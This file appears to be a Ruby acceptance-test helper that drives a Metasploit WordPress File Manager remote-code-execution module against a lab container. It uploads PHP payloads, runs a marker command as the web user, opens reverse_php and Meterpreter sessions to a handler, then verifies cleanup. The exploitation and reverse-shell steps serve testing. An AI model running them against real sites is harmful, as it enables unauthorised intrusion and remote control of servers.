# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require_relative 'native'

module Acceptance
  # Genuine application, public console and remote session observations.
  module FileManager
    OWNER = FileManagerProfiles::OWNER

    def fm_record(name, row)
      File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(row)) }
    end

    def fm_wait(seconds, &)
      wait_for_expect(seconds * 5, 0.2, &)
    end

    def fm_json(expression)
      output = console_command("irb -e #{("puts 'FILE_MANAGER_JSON=' + (#{expression}).to_json").inspect}", timeout: 50)
      lines = output.lines.grep(/^FILE_MANAGER_JSON=/)
      expect(lines.length).to eq(1), output
      JSON.parse(lines.first.delete_prefix('FILE_MANAGER_JSON='))
    end

    def fm_snapshot(label)
      @native.snapshot(label)
    end

    def fm_idle
      expect(fm_json('framework.sessions.keys')).to eq([])
      expect(fm_json('framework.jobs.keys')).to eq([])
    end

    def fm_resources(phase)
      services = ['app']
      services << 'db' unless @profile.fetch('mode') == 'unrelated'
      services << 'framework' unless @profile.fetch('payloads').empty?
      services.each do |service|
        %w[memory.events pids.events].each do |name|
          data = target_exec(service, 'cat', '/sys/fs/cgroup/' + name).lines.to_h do |line|
            key, value = line.split
            [key, Integer(value)]
          end
          fm_record('resource-counters.jsonl', phase: phase, service: service, counter: name, values: data)
          %w[oom oom_kill oom_group_kill max].each { |key| expect(data.fetch(key, 0)).to eq(0) }
        end
      end
    end

    def fm_call(options = {}, action: 'run', reuse: false)
      defaults = { 'SSL' => false, 'TARGETURI' => @profile.fetch('prefix') + '/', 'HttpClientTimeout' => 5, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true, 'WfsDelay' => 0 }
      values = defaults.merge(options)
      unless reuse
        console_command('back')
        expect(console_command("use #{OWNER}")).not_to match(/Failed to load|Unknown command|No results/)
        if options.key?('PAYLOAD')
          expect(console_command("set PAYLOAD #{options.fetch('PAYLOAD')}")).not_to match(/Failed|Invalid|not found/)
        else
          # The console remembers per-module selections across back/use.
          # Remove the explicit choice and let the owner's default apply.
          expect(console_command('unset PAYLOAD')).not_to include('[-]')
        end
      end
      endpoint = target_runtime.fetch('module_endpoints', target_runtime.fetch('endpoints')).fetch('app')
      endpoint_values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'VERBOSE' => true }
      fm_json('framework.instance_variable_get(:@file_manager_run_observer).reset; true') if action.start_with?('run')
      output = console_command(action + ' ' + format_datastore_options(endpoint_values.merge(values)), timeout: 70)
      expect(output).not_to match(/Exception|undefined method|Unknown command|Msf::OptionValidateError|Call stack:|Unknown datastore option/)
      source = fm_json('{location: active_module.method(:elfinder_post).source_location, sha256: Digest::SHA256.file("modules/exploits/multi/http/wp_file_manager_rce.rb").hexdigest, selected_payload: active_module.datastore["PAYLOAD"]}')
      expect(source.fetch('location').first).to end_with('/modules/exploits/multi/http/wp_file_manager_rce.rb')
      expect(source.fetch('sha256')).to eq(Digest::SHA256.file(File.expand_path('../../../modules/exploits/multi/http/wp_file_manager_rce.rb', __dir__)).hexdigest)
      fm_record('owner-provenance.jsonl', source.merge('action' => action, 'same_selected_instance' => reuse))
      output
    ensure
      fm_record('owning-calls.jsonl', action: action, options: values, same_selected_instance: reuse, output_base64: Base64.strict_encode64(output || console.all_data), wrapper_returned: !output.nil?)
    end

    def fm_recover(label)
      return if @profile.fetch('mode') == 'unrelated'

      current = fm_snapshot(label + '-before-operator-recovery')
      names = current.fetch('files').keys - @baseline.fetch('files').keys
      expect(names).to all(match(/\A[A-Za-z0-9]{6}\.php\z/))
      @native.recover(names, label, owner: true)
      target_exec('app', 'find', '/tmp/module-target-file-manager-proofs', '-mindepth', '1', '-maxdepth', '1', '-type', 'f', '-delete')
      expect(fm_snapshot(label + '-after-operator-recovery')).to eq(@baseline)
    end

    def fm_command(method, auto_check: true)
      2.times do |iteration|
        marker = "file_manager_owner_#{@case}_#{iteration}"
        output = fm_call({ 'COMMAND' => method, 'PAYLOAD' => 'php/exec', 'CMD' => "printf %s #{marker} > /tmp/module-target-file-manager-owner-proof", 'AutoCheck' => auto_check, 'DisablePayloadHandler' => true, 'AllowNoCleanup' => true }, reuse: iteration.positive?)
        expect(output).to include('Payload is at ')
        state = fm_snapshot('command-after-' + iteration.to_s)
        expect(state.values_at('owner_proof', 'owner_proof_uid')).to eq([marker, 33])
        names = state.fetch('files').keys - @baseline.fetch('files').keys
        expect(names.length).to eq(1)
        expect(names.first).to match(/\A[A-Za-z0-9]{6}\.php\z/)
        observation = fm_json('{dropped_files: framework.instance_variable_get(:@file_manager_run_observer).current.instance_variable_get(:@dropped_files)}')
        expect(observation.fetch('dropped_files')).to eq(names)
        fm_record('command-proofs.jsonl', method: method, iteration: iteration, marker: marker, uid: 33, file: names.first, operator_recovery_required: true)
        fm_recover('command-' + iteration.to_s)
        fm_idle
      end
    end

    def fm_connections(port)
      code = '$rows=[];foreach(["/proc/net/tcp","/proc/net/tcp6"] as $path){foreach(array_slice(file($path),1) as $line){$v=preg_split("/\\s+/",trim($line));$r=explode(":",$v[2]);if(in_array($v[3],["01","08"],true)&&hexdec(end($r))===(int)$argv[1]){$rows[]=$v;}}}echo json_encode($rows);'
      JSON.parse(target_exec('app', 'php', '-r', code, port.to_s))
    end

    def fm_listener_rows(port)
      code = "require 'json';rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map{|p|File.readlines(p).drop(1).map(&:split)};puts JSON.generate(rows.select{|r|r[3]=='0A'&&r[1].split(':').last.to_i(16)==#{port}})"
      JSON.parse(target_exec('framework', 'ruby', '-e', code))
    end

    def fm_wait_session(owner, payload)
      identifier = nil
      fm_wait(25) do
        rows = fm_json('framework.sessions.values.map { |s| {id:s.sid,type:s.type,owner:s.via_exploit,payload:s.via_payload} }')
        expect(rows.length).to eq(1)
        row = rows.first
        expect(row).to include('owner' => owner, 'payload' => 'payload/' + payload)
        identifier = row.fetch('id')
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line) }
        expect(events.map { |event| event.fetch('id') }).to include(identifier)
      end
      identifier
    end

    def fm_use_and_close(identifier, payload, owner, label, port)
      path = '/tmp/module-target-file-manager-proofs/' + label
      marker = 'file_manager_' + label.tr('-', '_')
      proof = fm_json("FileManagerSessionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect})")
      expect(proof).to include('owner' => owner, 'payload' => 'payload/' + payload, 'pid' => be_a(Integer), 'type' => payload == 'php/reverse_php' ? 'shell' : 'meterpreter')
      expect(target_exec('app', 'cat', path)).to eq(marker)
      expect(target_exec('app', 'stat', '-c', '%u', path).strip).to eq('33')
      # reverse_php executes each command in a fresh child shell. Its PID can
      # already be gone when the reply arrives, so capture that status inside
      # the real session command. Meterpreter exposes its persistent PHP PID.
      process = if proof.fetch('type') == 'shell'
                  proof.fetch('identity')
                else
                  target_exec('app', 'cat', "/proc/#{proof.fetch('pid')}/status")
                end
      expect(process[/^Uid:\s+(\d+)/, 1]).to eq('33')
      expect(process[/^Pid:\s+(\d+)/, 1].to_i).to eq(proof.fetch('pid'))
      expect(fm_connections(port)).not_to be_empty
      fm_record('session-proofs.jsonl', proof.merge('label' => label, 'file_bytes_base64' => Base64.strict_encode64(marker), 'process_status' => process, 'connections' => fm_connections(port)))
      expect(fm_json("DruidSessionControl.exit_remote(framework,#{identifier})")).to include('graceful_remote_exit_requested' => true)
      # PHP's Apache worker persists normally. Require transport closure rather
      # than demanding that an unrelated/reused worker PID disappear.
      fm_wait(20) { expect(fm_connections(port)).to eq([]) }
      fm_json("framework.sessions[#{identifier}]&.shell_close; true") if proof.fetch('type') == 'shell'
      fm_wait(20) { expect(fm_json('framework.sessions.keys')).to eq([]) }
      fm_record('session-closures.jsonl', id: identifier, label: label, remote_socket_absent_before_local_shell_close: true, remaining_sessions: [])
      target_exec('app', 'rm', '-f', '--', path)
    end

    def fm_native_sessions(payload, index)
      trigger = nil
      2.times do |iteration|
        port = 4470 + index
        console_command('back')
        expect(console_command('use exploit/multi/handler')).not_to include('[-]')
        { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'ExitOnSession' => false, 'ListenerTimeout' => 90 }.each do |key, value|
          expect(console_command("set #{key} #{value}")).not_to match(/\[-\]|Unknown datastore option/)
        end
        expect(console_command('run -j')).not_to include('[-]')
        jobs = fm_json('framework.jobs.keys')
        expect(jobs.length).to eq(1)
        job = jobs.first
        generated = fm_json("FileManagerSessionControl.cached_php(framework.jobs.fetch(#{job.inspect}),#{payload.inspect})")
        bytes = Base64.strict_decode64(generated.fetch('bytes_base64'))
        expect(Digest::SHA256.hexdigest(bytes)).to eq(generated.fetch('sha256'))
        delivery = iteration.zero? ? 'upload' : 'mkfile+put'
        fm_record('native-session-calibration.jsonl', generated.merge('iteration' => iteration, 'delivery' => delivery, 'phase' => 'generated', 'owning_calls' => 0))
        fm_wait(10) { expect(fm_listener_rows(port)).not_to be_empty }
        name = "module-target-file-manager-session-#{index}-#{iteration}.php"
        if delivery == 'upload'
          @native.upload('native-session-upload', name, bytes)
        else
          @native.write('native-session-mkfile-put', name, bytes)
        end
        trigger = Thread.new { @native.request('native-session-trigger', @native.path(name), timeout: 75) }
        trigger.report_on_exception = false
        identifier = fm_wait_session('exploit/multi/handler', payload)
        fm_use_and_close(identifier, payload, 'exploit/multi/handler', "native-#{index}-#{iteration}", port)
        expect(trigger.join(20)).not_to be_nil
        expect(trigger.value.code).to eq('200')
        fm_json("framework.jobs.stop_job(#{job.inspect}); true")
        fm_wait(10) { expect(fm_listener_rows(port)).to eq([]) }
        @native.recover([name], 'native-session')
        expect(fm_snapshot('native-session-after')).to eq(@baseline)
        fm_record('native-session-calibration.jsonl', payload: payload, iteration: iteration, delivery: delivery, phase: 'used_and_remote_closed', owning_calls: 0)
        fm_idle
      end
    ensure
      trigger&.kill if trigger&.alive?
      trigger&.join
    end

    def fm_owner_sessions(payload, index, method)
      2.times do |iteration|
        port = 4480 + index
        # Omit PAYLOAD for the actual default selection. The passive observer
        # must still report the unchanged staged payload on both executions.
        options = { 'COMMAND' => method, 'LHOST' => listener_host, 'LPORT' => port, 'DisablePayloadHandler' => false, 'WfsDelay' => 15 }
        options['PAYLOAD'] = payload unless payload == FileManagerProfiles::DEFAULT_PAYLOAD
        output = fm_call(options, action: 'run -z', reuse: iteration.positive?)
        observed = JSON.parse(File.readlines(File.join(target_runtime.fetch('artifacts'), 'effective-run-options.jsonl')).last)
        expect(observed.fetch('owner')).to eq(OWNER)
        expect(observed.fetch('options').fetch('PAYLOAD')).to eq(payload)
        identifier = fm_wait_session(OWNER, payload)
        name = output[%r{Payload is at \S+/([A-Za-z0-9]{6}\.php)\s*$}, 1]
        expect(name).not_to be_nil
        # FileDropper removes successful entries from its own queue. Its
        # Deleted message requires real remote existence checks before/after;
        # independently require the physical baseline before operator recovery.
        fm_wait(15) { expect(console.all_data).to include('Deleted ' + name) }
        fm_wait(15) { expect(fm_snapshot('owner-file-cleanup').fetch('files')).to eq(@baseline.fetch('files')) }
        observation = fm_json('{dropped_files: framework.instance_variable_get(:@file_manager_run_observer).current.instance_variable_get(:@dropped_files)}')
        expect(observation.fetch('dropped_files')).to eq([])
        fm_record('module-cleanup.jsonl', case: @case, method: method, iteration: iteration, physical_file_absent_before_operator_recovery: true, remote_existence_checks_passed: true, file: name)
        fm_use_and_close(identifier, payload, OWNER, "owner-#{@case}-#{iteration}", port)
        fm_wait(15) { expect(fm_json('framework.jobs.keys')).to eq([]) }
        fm_recover('owner-session-' + iteration.to_s)
        fm_idle
      end
    end
  end
end
